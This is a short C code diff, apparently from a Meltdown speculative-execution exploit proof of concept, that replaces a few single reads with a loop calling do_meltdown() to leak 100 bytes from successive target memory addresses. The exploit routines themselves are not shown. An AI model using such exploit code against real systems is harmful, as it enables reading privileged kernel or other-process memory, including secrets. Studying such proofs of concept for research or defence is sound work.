@@ -171,10 +171,9 @@ static void attack_init_uts_ns(){
     
     wait(1E9);
     cc_init();
-    printf("getting char %c at location %p\n", do_meltdown(target_adrs), target_adrs);
-    printf("getting char %c\n", do_meltdown(target_adrs));
-    printf("getting char %c\n", do_meltdown(target_adrs+2));
-    printf("getting char %c\n", do_meltdown(target_adrs+2));
+    for (int i=0;i<100;i++){
+        printf("getting char %c at location %p\n", do_meltdown(target_adrs+2*i), target_adrs+2*i);
+    }
     
 }
 
